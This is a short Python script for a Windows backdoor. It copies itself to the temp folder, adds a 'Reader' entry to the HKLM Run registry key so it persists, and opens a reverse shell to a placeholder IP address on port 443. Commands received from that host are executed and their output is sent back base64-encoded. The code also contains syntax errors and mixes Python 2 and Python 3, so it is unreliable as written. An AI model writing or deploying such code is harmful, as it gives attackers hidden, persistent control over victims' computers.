#!/usr/bin/python3
import sys, base64, os, socket, subprocess
from _winreg import *

def autorun(tempdir, fileName, run):
# Copy to /tmp
    os.system('copy %s %s'%(fileName, tempdir))

# Query reg for autorun
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey[]
    try:
            i = 0
            while True:
                subkey = EnumValue(key, i)
                runkey.append(subkey[0])
                i += 1
    except WindowsError:
        pass

# Key to be set
if 'Reader' not in runkey:
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
        SetValueEx(key ,'Reader',0,REG_SZ,r"%TEMP%\rd.exe")
        key.Close()
    except WindowsError:
        pass

def shell()
#Base64 encoded shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('<ip addr>', int(443)))
    s.send('[*] Connection Established!')
    while 1:
        data = s.recv(1024)
        if data == "quit": break
        proc = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        encoded = base64.b64encode(stdout_value)
        s.send(encoded)
    s.close()

def main():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir, fileName, run)
    shell()

if __name__ == "__main__":
    main()

